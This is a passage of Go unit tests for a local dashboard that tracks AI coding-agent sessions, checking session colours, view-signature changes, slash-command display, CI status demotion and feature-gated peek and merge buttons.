		Events:   []Event{{ID: 2}, {ID: 1}},
		Agents:   []Agent{{SessionID: "s1", Status: statusWorking, IdleSecs: 10, IdleSince: 100}},
		Activity: []SourceCount{{SourceApp: "myapp", Count: 2}},
	}

	// Only idle advanced (more seconds, earlier IdleSince) — signature must hold.
	idled := base
	idled.Agents = []Agent{{SessionID: "s1", Status: statusWorking, IdleSecs: 999, IdleSince: 1}}
	if viewSignature(base) != viewSignature(idled) {
		t.Error("signature changed on idle-only difference")
	}

	// A genuinely new event must move the signature.
	newEvent := base
	newEvent.Events = []Event{{ID: 3}, {ID: 2}, {ID: 1}}
	if viewSignature(base) == viewSignature(newEvent) {
		t.Error("signature unchanged after a new event")
	}

	// A status flip (e.g. agent went to "waiting for you") must move it too.
	flipped := base
	flipped.Agents = []Agent{{SessionID: "s1", Status: statusWaiting, IdleSecs: 10, IdleSince: 100}}
	if viewSignature(base) == viewSignature(flipped) {
		t.Error("signature unchanged after a status change")
	}
}

func TestSessColor(t *testing.T) {
	// Deterministic: same id -> same color across calls.
	first := sessColor("abc123")
	second := sessColor("abc123")
	if first != second {
		t.Errorf("sessColor not deterministic: %q != %q", first, second)
	}
	// Empty id -> empty string (no chip/tint).
	if got := sessColor(""); got != "" {
		t.Errorf("sessColor(\"\") = %q, want \"\"", got)
	}
	// Any non-empty id maps into the palette.
	for _, id := range []string{"a", "session-1", "7f3c9a01", "xyz", "deadbeef"} {
		if c := sessColor(id); !slices.Contains(sessPalette, c) {
			t.Errorf("sessColor(%q) = %q, not in palette", id, c)
		}
	}
}

func TestAssignSessColors(t *testing.T) {
	mkAgents := func(ids ...string) []Agent {
		out := make([]Agent, len(ids))
		for i, id := range ids {
			out[i] = Agent{SessionID: id, firstSeq: i} // firstSeq = arrival order
		}
		return out
	}

	// Distinctness: a roster no larger than the palette gets unique colors,
	// regardless of hash collisions — the greedy probe deconflicts them.
	ids := []string{"alpha", "bravo", "charlie", "delta", "echo", "foxtrot", "golf"}
	got := assignSessColors(mkAgents(ids...), nil)
	owner := map[string]string{}
	for _, id := range ids {
		c := got[id]
		if c == "" {
			t.Fatalf("no color for %q", id)
		}
		if prev, ok := owner[c]; ok {
			t.Errorf("color %s shared by %q and %q; want distinct", c, prev, id)
		}
		owner[c] = id
	}

	// Incumbents keep their color when a newer agent arrives.
	before := assignSessColors(mkAgents("alpha", "bravo", "charlie"), nil)
	after := assignSessColors(mkAgents("alpha", "bravo", "charlie", "delta"), nil)
	for _, id := range []string{"alpha", "bravo", "charlie"} {
		if before[id] != after[id] {
			t.Errorf("incumbent %q recolored on add: %s -> %s", id, before[id], after[id])
		}
	}
	if after["delta"] == "" {
		t.Error("newcomer delta got no color")
	}

	// Empty session ids are skipped (no chip/tint to render).
	withEmpty := assignSessColors(mkAgents("alpha"), []Event{{SessionID: ""}})
	if _, ok := withEmpty[""]; ok {
		t.Error("empty session id should not be assigned a color")
	}

	// A session that appears only in the events log (not on the roster) still gets
	// a color, deconflicted against the roster agents.
	mixed := assignSessColors(mkAgents("alpha", "bravo"), []Event{{SessionID: "log-only"}, {SessionID: "alpha"}})
	if mixed["log-only"] == "" {
		t.Error("events-only session got no color")
	}
	if mixed["log-only"] == mixed["alpha"] || mixed["log-only"] == mixed["bravo"] {
		t.Errorf("events-only session %s collided with a roster agent", mixed["log-only"])
	}

	// More sessions than colors: everyone still gets a palette color (collisions
	// resume past the palette, but nothing panics or goes blank).
	many := make([]string, len(sessPalette)+3)
	for i := range many {
		many[i] = fmt.Sprintf("sess-%d", i)
	}
	all := assignSessColors(mkAgents(many...), nil)
	for _, id := range many {
		if !slices.Contains(sessPalette, all[id]) {
			t.Errorf("overflow session %q got %q, not in palette", id, all[id])
		}
	}
}

func TestSessPaletteIsHex(t *testing.T) {
	re := regexp.MustCompile(`^#[0-9a-fA-F]{6}$`)
	if len(sessPalette) == 0 {
		t.Fatal("sessPalette is empty")
	}
	for _, c := range sessPalette {
		// Guards against a future non-hex token being silently blanked to
		// "ZgotmplZ" by html/template's style-attribute escaper.
		if !re.MatchString(c) {
			t.Errorf("palette entry %q is not a #rrggbb hex literal", c)
		}
	}
}

func TestHandleDashboard_SessionColors(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	// One event with a session id, one without (some hooks carry no session_id).
	insertEvent(db, Event{TS: now, SourceApp: "myapp", Branch: "br", SessionID: "sess-abc",
		EventType: "PreToolUse", ToolName: "Bash", Summary: "Bash: ls", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: now, SourceApp: "myapp", EventType: "SessionStart",
		Summary: "SessionStart", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	// Only one session is visible, so assignSessColors hits no collision and hands
	// it its hash-preferred color — i.e. exactly sessColor("sess-abc").
	want := sessColor("sess-abc")

	// A colored chip is rendered for the session.
	if !strings.Contains(body, `class="chip"`) {
		t.Errorf("expected a session chip in output:\n%s", body)
	}
	// The session's color appears (chip + row tint both derive from it).
	if !strings.Contains(body, want) {
		t.Errorf("expected session color %q in output:\n%s", want, body)
	}
	// The row is tinted via color-mix against Canvas.
	if !strings.Contains(body, "color-mix") {
		t.Errorf("expected a color-mix row tint:\n%s", body)
	}
	// The roster carries a column headed "session" (the tmux session name).
	if !strings.Contains(body, "<th>session</th>") {
		t.Errorf("expected a session column header:\n%s", body)
	}
	// Exactly one row carries an inline tint: the session-bearing Recent-events
	// row. The empty-session row's {{ if .SessionID }} guard skips the style attr
	// entirely, and the roster chip uses a solid background (not color-mix), so
	// neither matches. This proves the empty-session row is left untinted.
	if n := strings.Count(body, `style="background: color-mix`); n != 1 {
		t.Errorf("expected exactly 1 tinted row, got %d:\n%s", n, body)
	}
}

func TestViewSignature_TracksTmuxSession(t *testing.T) {
	base := dashboardData{
		Agents:   []Agent{{SessionID: "s1", TmuxSession: "alpha", Status: statusWorking}},
		Activity: []SourceCount{{SourceApp: "myapp", TmuxSession: "alpha", Count: 2}},
	}

	// Roster row differs only by tmux session name.
	rosterDiff := base
	rosterDiff.Agents = []Agent{{SessionID: "s1", TmuxSession: "beta", Status: statusWorking}}
	if viewSignature(base) == viewSignature(rosterDiff) {
		t.Error("signature unchanged after a roster tmux-session change")
	}

	// Activity row differs only by tmux session name.
	activityDiff := base
	activityDiff.Activity = []SourceCount{{SourceApp: "myapp", TmuxSession: "beta", Count: 2}}
	if viewSignature(base) == viewSignature(activityDiff) {
		t.Error("signature unchanged after an activity tmux-session change")
	}
}

func TestViewSignature_TracksCwd(t *testing.T) {
	// The roster renders each session's cwd (the branch cell's copy target), so a
	// session that moves worktrees must repaint — otherwise the board keeps
	// handing out a stale path.
	base := dashboardData{
		Agents: []Agent{{SessionID: "s1", Branch: "main", Cwd: "/w/one", Status: statusWorking}},
	}
	moved := base
	moved.Agents = []Agent{{SessionID: "s1", Branch: "main", Cwd: "/w/two", Status: statusWorking}}
	if viewSignature(base) == viewSignature(moved) {
		t.Error("signature unchanged after a roster cwd change")
	}
}

// The specific collision the %q in viewSignature prevents. These fields are free
// text and can contain the ":" that delimits them, so written unquoted one
// field's tail masquerades as the next field's head and two genuinely different
// rosters hash alike — a repaint that never happens, leaving a stale copy target
// on the board. Reverting %q to %s makes exactly this test fail, which the
// "some change is noticed" test above cannot do.
func TestViewSignature_DelimiterCannotBeSmuggled(t *testing.T) {
	// Branch "main:/w" + cwd "one" against branch "main" + cwd "/w:one". Both
	// concatenate to the same "…main:/w:one…" once the ":" separating branch from
	// cwd is indistinguishable from the ":" inside the data. Note the second
	// path's separator is the delimiter itself — a "/" there would NOT collide,
	// and the test would pass under %s too, i.e. prove nothing.
	a := dashboardData{Agents: []Agent{{SessionID: "s1", Branch: "main:/w", Cwd: "one", Status: statusWorking}}}
	b := dashboardData{Agents: []Agent{{SessionID: "s1", Branch: "main", Cwd: "/w:one", Status: statusWorking}}}
	if viewSignature(a) == viewSignature(b) {
		t.Error("signature collides across a field boundary: a delimiter in the data is being read as the delimiter")
	}
}

func TestHandleDashboard_ShowsLastCommand(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC()
	recent := now.Add(-2 * time.Minute).Format(time.RFC3339)
	// The session typed /git-rebase, then stopped. Its Doing is unrelated/empty, so
	// the slash command surfaces as a muted second line.
	insertEvent(db, Event{TS: now.Add(-5 * time.Minute).Format(time.RFC3339), SourceApp: "myapp", Branch: "fix-45",
		SessionID: "sess-cmd", EventType: "UserPromptSubmit", SlashCommand: "/git-rebase", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: recent, SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-cmd",
		EventType: "Stop", Summary: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, `<div class="lastcmd" title="last slash command">↳ /git-rebase</div>`) {
		t.Errorf("expected the slash command as a muted second line in:\n%s", body)
	}
}

func TestHandleDashboard_NoLastCommandLine(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC()
	recent := now.Add(-2 * time.Minute).Format(time.RFC3339)
	// A session that never ran a slash command renders no ↳ second line.
	insertEvent(db, Event{TS: recent, SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-plain",
		EventType: "PreToolUse", ToolName: "Bash", Summary: "Bash: go build", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if strings.Contains(body, `class="lastcmd"`) {
		t.Errorf("a session with no slash command must not render a lastcmd line in:\n%s", body)
	}
}

func TestHandleDashboard_DedupesLastCommandAgainstSkill(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC()
	recent := now.Add(-2 * time.Minute).Format(time.RFC3339)
	// A skill-backed slash command: Doing is the skill name "code-review" (no slash)
	// and LastCommand is "/code-review". The ↳ line would merely duplicate line 1,
	// so it must be suppressed — while the skill still shows on line 1.
	insertEvent(db, Event{TS: now.Add(-4 * time.Minute).Format(time.RFC3339), SourceApp: "myapp", Branch: "fix-45",
		SessionID: "sess-skill", EventType: "UserPromptSubmit", SlashCommand: "/code-review", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: recent, SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-skill",
		EventType: "PreToolUse", ToolName: "Skill", Summary: "Skill: code-review", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, "code-review") {
		t.Errorf("the skill should still show on line 1 in:\n%s", body)
	}
	if strings.Contains(body, "↳ /code-review") {
		t.Errorf("a skill-backed command must not duplicate as a ↳ line in:\n%s", body)
	}
}

func TestHandleDashboard_ItalicDoingWithLastCommand(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC()
	at := func(mins int) string { return now.Add(time.Duration(-mins) * time.Minute).Format(time.RFC3339) }
	// One session that ran the address-gh-review skill, typed /git-rebase, then
	// stopped. Stopped → status "waiting for you" → DoingActive false, so line 1
	// is the italic "last completed" variant; /git-rebase is distinct from
	// "/"+Doing, so the muted second line survives dedupe. The two must coexist.
	insertEvent(db, Event{TS: at(6), SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-italic",
		EventType: "PreToolUse", ToolName: "Skill", Summary: "Skill: address-gh-review", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: at(4), SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-italic",
		EventType: "UserPromptSubmit", SlashCommand: "/git-rebase", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: at(2), SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-italic",
		EventType: "Stop", Summary: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, `<em title="last completed">address-gh-review</em>`) {
		t.Errorf("expected italic last-completed line 1 in:\n%s", body)
	}
	if !strings.Contains(body, `<div class="lastcmd" title="last slash command">↳ /git-rebase</div>`) {
		t.Errorf("expected the muted slash-command second line alongside the italic line 1 in:\n%s", body)
	}
}

func TestHandleDashboard_RendersTmuxSession(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", Branch: "fix-1710", TmuxSession: "roster-colors",
		SessionID: "sess-a", EventType: "Stop", Summary: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	for _, want := range []string{
		"roster-colors",    // the disambiguating name appears
		"fix-1710",         // branch shown in its own column
		"<th>session</th>", // roster's session-name column (now last)
		"<th>branch</th>",  // roster keeps a distinct branch column
		"<th>events</th>",  // activity table renders
		"<th>id</th>",      // the renamed session-id chip column
	} {
		if !strings.Contains(body, want) {
			t.Errorf("missing %q in dashboard:\n%s", want, body)
		}
	}
	// The branch is its own column, not a dimmed sub-label stacked under the name.
	if strings.Contains(body, `<span class="sub">`) {
		t.Errorf("stacked branch sub-label should be gone:\n%s", body)
	}
}

func TestDemotePendingCI(t *testing.T) {
	agents := []Agent{
		{SessionID: "needs", Status: statusNeedsYou, StatusRank: 1, CI: "pending"},
		{SessionID: "waiting", Status: statusWaiting, StatusRank: 0, CI: "pending"},
		{SessionID: "approval", Status: statusApproval, StatusRank: 1, CI: "pending"},  // a real prompt: untouched
		{SessionID: "needs-green", Status: statusNeedsYou, StatusRank: 1, CI: "green"}, // CI not pending: untouched
		{SessionID: "working", Status: statusWorking, StatusRank: 5, CI: "pending"},    // not an alert: untouched
		{SessionID: "needs-nocheck", Status: statusNeedsYou, StatusRank: 1, CI: ""},    // no CI info: untouched
	}
	demotePendingCI(agents)
	got := map[string]Agent{}
	for _, a := range agents {
		got[a.SessionID] = a
	}
	for _, id := range []string{"needs", "waiting"} {
		if a := got[id]; a.Status != statusBackground || a.StatusRank != rankBackground {
			t.Errorf("%s with pending CI should demote to %q rank %d, got %q rank %d", id, statusBackground, rankBackground, a.Status, a.StatusRank)
		}
	}
	if a := got["approval"]; a.Status != statusApproval {
		t.Errorf("a permission prompt must survive pending CI, got %q", a.Status)
	}
	if a := got["needs-green"]; a.Status != statusNeedsYou {
		t.Errorf("green CI must not demote, got %q", a.Status)
	}
	if a := got["working"]; a.Status != statusWorking {
		t.Errorf("non-alert working row must be untouched, got %q", a.Status)
	}
	if a := got["needs-nocheck"]; a.Status != statusNeedsYou {
		t.Errorf("row with no CI info must be untouched, got %q", a.Status)
	}
}

func getBody(t *testing.T, db *sql.DB, target string) string {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, target, nil)
	rec := httptest.NewRecorder()
	handleDashboard(rec, req, db, newCICache(), &peekConfig{cache: newPaneCache()}, &actionConfig{})
	if rec.Code != http.StatusOK {
		t.Fatalf("status=%d", rec.Code)
	}
	return rec.Body.String()
}

// The peek control renders only when the feature is enabled AND the row's pane is
// live. buildDashboardData sets LiveTmux; here we assert the template gate by
// rendering the content template directly.
func TestContentTemplate_PeekControlGated(t *testing.T) {
	base := dashboardData{
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting,
			TmuxSession: "sess", TmuxPane: "%3", LiveTmux: true,
		}},
	}

	render := func(d dashboardData) string {
		var buf bytes.Buffer
		if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
			t.Fatal(err)
		}
		return buf.String()
	}

	on := base
	on.PeekEnabled = true
	if !strings.Contains(render(on), `data-pane="%3"`) {
		t.Error("enabled + live: expected a peek control with data-pane=%3")
	}

	off := base // PeekEnabled false
	if strings.Contains(render(off), `data-pane=`) {
		t.Error("disabled: expected no peek control")
	}
}

// renderDashboard executes the full dashboardTmpl (mirroring handleDashboard,
// server.go:532) rather than just the "content" sub-template, since the
// data-csrf attribute lives on <body>, outside "content".
func renderDashboard(t *testing.T, d dashboardData) string {
	t.Helper()
	d.Now = time.Now()
	var buf bytes.Buffer
	if err := dashboardTmpl.Execute(&buf, d); err != nil {
		t.Fatal(err)
	}
	return buf.String()
}

// PR-action buttons (squash/admin/close/ready) render in the roster only when
// --enable-merge is on, and the CSRF token is only echoed onto <body> in that
// case too — the JS action handler reads it from data-csrf.
func TestDashboardRendersActionButtonsOnlyWhenEnabled(t *testing.T) {
	base := dashboardData{Agents: []Agent{{SessionID: "s1", Branch: "feature", Status: statusWaiting}}}
	// disabled
	off := base
	off.MergeEnabled = false
	if strings.Contains(renderDashboard(t, off), "data-action=") {
		t.Fatal("action buttons rendered while disabled")
	}
	// enabled
	on := base
	on.MergeEnabled = true
	on.CSRFToken = "tok"
	html := renderDashboard(t, on)
	if !strings.Contains(html, "data-action=") || !strings.Contains(html, `data-csrf="tok"`) {
		t.Fatal("action buttons / csrf token missing while enabled")
	}
}
